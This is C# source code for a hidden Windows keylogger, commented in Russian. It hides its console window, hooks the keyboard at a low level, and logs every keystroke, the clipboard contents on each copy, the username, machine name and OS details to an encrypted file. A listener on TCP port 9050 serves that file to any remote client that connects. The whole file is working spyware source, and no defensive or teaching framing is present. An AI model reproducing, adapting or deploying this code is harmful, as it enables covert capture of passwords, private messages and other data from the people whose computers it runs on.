using System;
using System.Windows;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Net.Mail;
using System.Net.NetworkInformation;
using System.Threading;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Security.Permissions;

namespace ConsoleApp2
{
    class Program
    {

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int WM_SYSKEYUP = 0x0105;
        private const int WM_SYSKEYDOWN = 0x0104;
        public const int KF_REPEAT = 0X40000000;

        private const int VK_SHIFT = 0x10;	// SHIFT
        private const int VK_CONTROL = 0x11;	// CONTROL
        private const int VK_MENU = 0x12; // ALT
        private const int VK_CAPITAL = 0x14; // CAPS LOCK

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        public static string mss;
        public static int myi = 0;

        [STAThread]
        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            // Hide
            ShowWindow(handle, SW_HIDE);


            _hookID = SetHook(_proc);
            // получаем переменные окружения и данные о пользователе

            Writer(Encrypt("CurrentDirectory: {0}" + Environment.CurrentDirectory + "\n", "Key"));
            Writer(Encrypt("MachineName: {0}" + Environment.MachineName + "\n", "Key"));
            Writer(Encrypt("OSVersion: {0}" + Environment.OSVersion.ToString() + "\n", "Key"));
            Writer(Encrypt("SystemDirectory: {0}" + Environment.SystemDirectory + "\n", "Key"));
            Writer(Encrypt("UserDomainName: {0}" + Environment.UserDomainName + "\n", "Key"));
            Writer(Encrypt("UserInteractive: {0}" + Environment.UserInteractive + "\n", "Key"));
            Writer(Encrypt("UserName: {0}" + Environment.UserName + "\n", "Key"));

            // получаем буфер обмена при запуске
            string htmlData = GetBuff();
            Console.WriteLine("Clipboard: {0}", htmlData);

            // получаем текущую раскладку клавиатуры

            ushort lang = GetKeyboardLayout();
            mss = lang.ToString();
            Console.WriteLine("Первоначальная раскладка: {0}\n", mss);
            Writer(Encrypt("Первоначальная раскладка: " + mss + "\n", "Key"));
            Thread mtr = new System.Threading.Thread(ServerSocket);
            mtr.Start();
            Application.Run();


            UnhookWindowsHookEx(_hookID);
        }
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }


        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                KeysConverter kc = new KeysConverter();
                string mystring = kc.ConvertToString((Keys)vkCode);

                string original = mystring;
                string encrypted;

                // запрашиваем раскладку клавиатуры для каждого символа


                ushort lang_check = GetKeyboardLayout();
                string mss_check = lang_check.ToString();

                if (mss == mss_check) { }
                else
                {
                    Console.WriteLine("Смена раскладки: {0}", mss_check);
                    encrypted = Encrypt("\n<Смена раскладки:" + mss_check + " >\n", "Key");

                    Writer(encrypted);
                    mss = mss_check;
                }

                if (wParam == (IntPtr)WM_KEYDOWN)   //пишем все клавиши подряд
                {
                    Writer(Encrypt(original, "Key"));

                }

                if (wParam == (IntPtr)WM_KEYUP) // пишем только те что были отпущены (в нашем случае все контрольные)
                {
                    if (Keys.LControlKey == (Keys)vkCode) { Writer(Encrypt(original, "Key")); } // если был отпущен = запись
                    if (Keys.LShiftKey == (Keys)vkCode) { Writer(Encrypt(original, "Key")); } // если был отпущен = запись
                }

                // ловим сочетание клавиш CTRL+C (копирование в буфер)
                if (Keys.C == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {

                    Console.WriteLine("CTRL+C: {0}", (Keys)vkCode);

                    string htmlData1 = GetBuff();                                                   // получаем буфер
                    Writer(Encrypt("Содержимое буфера: " + htmlData1 + "\n", "Key"));                  // записываем буфер
                    Console.WriteLine("Clipboard: {0}", htmlData1);

                    encrypted = Encrypt("\n<COPY>\n", "Key");
                    Writer(encrypted);
                }

                else if (Keys.V == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {

                    //return (IntPtr)1; // вроде как блокировка нажатия работает, проверил
                    Console.WriteLine("CTRL+V: {0}", (Keys)vkCode);
                    encrypted = Encrypt("\n<PASTE>\n", "Key");
                    Writer(encrypted);

                }
                else if (Keys.Z == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {

                    Console.WriteLine("CTRL+Z: {0}", (Keys)vkCode);
                    encrypted = Encrypt("\n<Отмена>\n", "Key");
                    Writer(encrypted);
                }
                else if (Keys.F == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {

                    Console.WriteLine("CTRL+F: {0}", (Keys)vkCode);
                    encrypted = Encrypt("\n<Искать>\n", "Key");
                    Writer(encrypted);
                }
                else if (Keys.A == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {

                    Console.WriteLine("CTRL+A: {0}", (Keys)vkCode);
                    encrypted = Encrypt("\n<Выделить всё>\n", "Key");
                    Writer(encrypted);
                }
                else if (Keys.N == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {

                    Console.WriteLine("CTRL+N: {0}", (Keys)vkCode);
                    encrypted = Encrypt("\n<Новый>\n", "Key");
                    Writer(encrypted);
                }
                else if (Keys.T == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {

                    Console.WriteLine("CTRL+T: {0}", (Keys)vkCode);
                    encrypted = Encrypt("\n<Нов.вкладка>\n", "Key");
                    Writer(encrypted);

                }
                else if (Keys.X == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {

                    Console.WriteLine("CTRL+X: {0}", (Keys)vkCode);
                    encrypted = Encrypt("\n<Вырезать>\n", "Key");
                    Writer(encrypted);
                }

                Console.WriteLine("Original:   {0}", original);

            }


            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }


        public static string GetBuff()
        {
            string htmlData = Clipboard.GetText(TextDataFormat.Text);
            return htmlData;
        }


        public static void ServerSocket()
        {
            while (true)
            {
                {
                    try
                    {
                        IPEndPoint ipep = new IPEndPoint(IPAddress.Any, 9050);
                        Socket newsock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        newsock.Bind(ipep);
                        newsock.Listen(10);
                        Console.WriteLine("Waiting for a client...");
                        Socket client = newsock.Accept();
                        IPEndPoint clientep = (IPEndPoint)client.RemoteEndPoint;
                        Console.WriteLine("Connected with {0} at port {1}", clientep.Address, clientep.Port);
                        // FileInfo fi = new FileInfo(Application.StartupPath + @"\log.dat");
                        // string fsize= fi.Length.ToString();
                        try
                        {

                            client.SendFile(Application.StartupPath + @"\log.dat");
                            Console.WriteLine("Disconnected from {0}", clientep.Address);
                            client.Close();
                            newsock.Close();

                        }
                        catch (Exception ex)
                        {
                            Console.Write(ex.Message);
                        }
                    }

                    catch (Exception e)
                    {
                        Console.Write(e.Message);
                    }


                }
            }

        }


        // Записываем шифрованный текст в файл

        public static void Writer(string inputstring)
        {

            StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.dat", true);

            sw.WriteLine(inputstring);
            sw.Flush();
            sw.Close();

        }

        public static string Encrypt(string plainText, string password, string salt = "Key", string hashAlgorithm = "SHA1", int passwordIterations = 2, string initialVector = "OFRna73m*aze01xY", int keySize = 256)
        {
            if (string.IsNullOrEmpty(plainText))
                return "";

            byte[] initialVectorBytes = Encoding.ASCII.GetBytes(initialVector);
            byte[] saltValueBytes = Encoding.ASCII.GetBytes(salt);
            byte[] plainTextBytes = Encoding.UTF8.GetBytes(plainText);

            PasswordDeriveBytes derivedPassword = new PasswordDeriveBytes
             (password, saltValueBytes, hashAlgorithm, passwordIterations);

            byte[] keyBytes = derivedPassword.GetBytes(keySize / 8);
            RijndaelManaged symmetricKey = new RijndaelManaged();
            symmetricKey.Mode = CipherMode.CBC;

            byte[] cipherTextBytes = null;

            using (ICryptoTransform encryptor = symmetricKey.CreateEncryptor
            (keyBytes, initialVectorBytes))
            {
                using (MemoryStream memStream = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream
                             (memStream, encryptor, CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length);
                        cryptoStream.FlushFinalBlock();
                        cipherTextBytes = memStream.ToArray();
                        memStream.Close();
                        cryptoStream.Close();
                    }
                }
            }

            symmetricKey.Clear();
            return Convert.ToBase64String(cipherTextBytes);
        }


        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        internal static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern uint MapVirtualKey(uint uCode, uint uMapType);

        const int SW_HIDE = 0;

        //------------------------------Пробуем узнать раскладку клавиатуры-------------------------------------------------//

        [DllImport("user32.dll", SetLastError = true)]
        static extern int GetWindowThreadProcessId(
            [In] IntPtr hWnd,
            [Out, Optional] IntPtr lpdwProcessId
            );

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern ushort GetKeyboardLayout(
            [In] int idThread
            );


        static ushort GetKeyboardLayout()
        {
            return GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
        }

    }
}
